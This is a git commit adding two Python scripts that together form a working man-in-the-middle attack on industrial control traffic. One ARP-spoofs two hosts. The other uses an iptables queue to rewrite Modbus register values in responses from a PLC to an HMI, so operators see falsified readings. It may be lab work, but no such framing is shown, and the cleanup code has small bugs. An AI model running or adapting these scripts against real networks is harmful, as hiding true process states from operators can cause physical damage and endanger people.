89825e6145fb8c0e6ecda4be2de00b94688661a5
kevin <kevin0920911@gmail.com>
2025-07-16 21:10:19 -0400

    finish packet modify

---
+++ MITM.py
@@ -0,0 +1,41 @@
+import sys
+import threading
+from scapy.all import *
+import time
+
+conf.iface = "eth1"
+
+
+def get_mac(IP1):
+    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP1)
+    res, _ = srp(arp_request, timeout=2, verbose=False)
+    for sent, recive in res:
+        return recive.hwsrc
+    return None
+
+def spoof(ip, mac, spoof_ip, spoof_mac):
+    pkt = ARP(op=2, pdst=ip, hwdst=mac, psrc=spoof_ip, hwsrc=spoof_mac) 
+    send(pkt, verbose=False)
+
+def resotre(ip, mac, spoof_ip, spoof_mac):
+    pkt = ARP(op=2, pdst=ip, hwdst=mac, psrc=spoof_ip, hwsrc=spoof_mac) 
+    send(pkt, verbose=False)
+
+target1_IP = sys.argv[1]
+target1_MAC = get_mac(target1_IP)
+target2_IP = sys.argv[2]
+target2_MAC = get_mac(target2_IP)
+my_mac = get_if_hwaddr(conf.iface)
+
+def MITM():
+    try:
+        while True:
+            spoof(target1_IP, target1_MAC, target2_IP, my_mac)
+            spoof(target2_IP, target2_MAC, target1_IP, my_mac)
+            time.sleep(1)
+    except KeyboardInterrupt:
+        resotre(target1_IP, target1_MAC, target2_IP, target2_MAC)
+        resotre(target2_IP, target2_MAC, target2_IP, target1_MAC)
+
+if __name__ == '__main__':
+    MITM()
---
+++ packet_modify.py
@@ -0,0 +1,71 @@
+from scapy.all import *
+import sys
+from netfilterqueue import NetfilterQueue
+import subprocess
+import json
+
+conf.iface = "eth1"
+
+PLC_IP = sys.argv[1]
+HMI_IP = sys.argv[2]
+
+with open('reg_modify.json') as f:
+    modify_reg_table = json.load(f)
+
+def process_packet(pkt):
+    try:
+        z = IP(pkt.get_payload())
+        if z.haslayer(Raw) and (z.sport == 502):
+            raw_data = z[Raw].load
+            if len(raw_data) >= 8:
+                function_code = raw_data[7]
+                if function_code == 3:
+                    data_list = {
+                        'transcation_id': int.from_bytes(raw_data[0:2], byteorder='big'),
+                        'protocol_id': int.from_bytes(raw_data[2:4], byteorder='big'),
+                        'length': int.from_bytes(raw_data[4:6], byteorder='big'),
+                        'unit_id': raw_data[6],
+                        'function_code': raw_data[7],
+                        'byte_count': raw_data[8],
+                        'data': raw_data[9::]
+                    }
+                    if 9 + data_list['byte_count'] > len(raw_data):
+                        pkt.accept()
+                        return
+
+                    modify_raw_data = bytearray(raw_data)
+                    for i in range(0, data_list['byte_count'], 2):
+                        v = 9 + i
+                        value = int.from_bytes(raw_data[v:v+2], byteorder='big')
+                        key = str(i // 2)
+                        modify_vlue = value
+                        if key in modify_reg_table:
+                            modify_vlue = modify_reg_table[key]
+                            modify_raw_data[v:v+2] = modify_vlue.to_bytes(2, byteorder='big')
+                    z[Raw].load = bytes(modify_raw_data)
+                    del z[IP].len
+                    del z[IP].chksum
+                    del z[TCP].chksum
+                    pkt.set_payload(bytes(z))
+            pkt.accept()
+        else:
+            pkt.accept()
+    except Exception as e:
+        print(f"Error: {e}")
+        pkt.accept()
+
+QUEUE_NUM = 0
+subprocess.run(
+    f"iptables -I FORWARD -p tcp --sport 502 -j NFQUEUE --queue-num {QUEUE_NUM} ",
+    shell=True
+)
+
+packet_queue = NetfilterQueue()
+try:
+    packet_queue.bind(QUEUE_NUM, process_packet)
+    packet_queue.run()
+except KeyboardInterrupt:
+    pass
+finally:
+    subprocess.run(f"iptables -D FORWARD -p tcp --dport 502 -j NFQUEUE --queue-num {QUEUE_NUM}", shell=True)
+    packet_queue.unbind()
